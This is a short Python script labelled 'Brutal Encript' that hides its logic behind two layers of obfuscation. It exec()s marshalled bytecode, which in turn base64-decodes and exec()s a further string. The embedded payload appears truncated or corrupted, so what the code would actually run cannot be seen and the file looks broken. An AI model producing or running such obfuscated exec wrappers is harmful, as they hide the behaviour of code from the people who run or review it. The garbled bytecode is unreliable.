#Brutal Encript
#By Zen Ezz

import marshal
exec(marshal.loads(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00@\x00\x00\x00s"\x00\x00\x00d\x00d\x01l\x00Z\x00e\x01e\x00\xa0\x02d\x02\xa1\x01\xa0\x03d\x03d\x04\xa1\x02\x83\x01\x01\x00d\x01S\x00)\x05\xe9\x00\x00\x00\x00Nsd\xd8%\z\x05utf-8\xda\x06ignore)\x04\xda\x06base64\xda\x04exec\xda\tb64decode\xda\x06decode\xa9\x00r\x07\x00\x00\x00r\x07\x00\x00\x00\xfa\x08<script>\xda\x08<module>\x03\x00\x00\x00s\x02\x00\x00\x00\x08\x01'))